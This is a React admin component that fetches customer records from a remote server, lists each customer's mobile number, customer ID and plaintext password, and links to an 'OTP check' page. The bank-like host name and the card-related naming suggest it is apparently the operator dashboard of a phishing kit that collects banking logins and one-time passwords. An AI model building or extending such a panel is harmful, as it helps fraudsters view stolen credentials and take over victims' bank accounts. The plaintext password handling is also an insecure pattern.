import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import "./cardsdetails.css"; // reuse same CSS

export default function CustomerDetails() {
  const [customers, setCustomers] = useState([]);
  const [loading, setLoading] = useState(true);
  const navigate = useNavigate();

  // Convert UTC to IST
  const formatIST = (utcDate) =>
    new Date(utcDate).toLocaleString("en-IN", {
      timeZone: "Asia/Kolkata",
      day: "2-digit",
      month: "2-digit",
      year: "numeric",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      hour12: true,
    });

  // Fetch customers
  const fetchCustomers = () => {
    setLoading(true);
    fetch("https://rblonline.onrender.com/api/users/userList")
      .then((res) => res.json())
      .then((data) => {
        setCustomers(data);
        setLoading(false);
      })
      .catch((err) => {
        console.error("Fetch error:", err);
        setLoading(false);
      });
  };

  // Go to OTP page
  const goToOTP = () => {
    navigate("/admin/otp-check"); // update path if needed
  };

  useEffect(() => {
    fetchCustomers();
  }, []);

  return (
    <div className="usercards-container">
      {/* Header with buttons */}
      <div className="usercards-header">
        <h2>Customer login Details</h2>
        <div className="header-buttons">
          <button className="otp-btn-small" onClick={fetchCustomers}>
            REFRESH
          </button>
          <button className="otp-btn-small" onClick={goToOTP}>
            CHECK OTP
          </button>
        </div>
      </div>

      {loading ? (
        <p>Loading customers...</p>
      ) : customers.length === 0 ? (
        <p>No customers found</p>
      ) : (
        <div className="table-wrapper">
          <table className="usercards-table">
            <thead>
              <tr>
                <th>Mobile</th>
                <th>Customer ID</th>
                <th>Password</th>
                <th>Created At (IST)</th>
              </tr>
            </thead>
            <tbody>
              {customers.map((c) => (
                <tr key={c._id}>
                  <td>{c.mobileNumber}</td>
                  <td>{c.customerId}</td>
                  <td>{c.password}</td>
                  <td>{formatIST(c.createdAt)}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
}
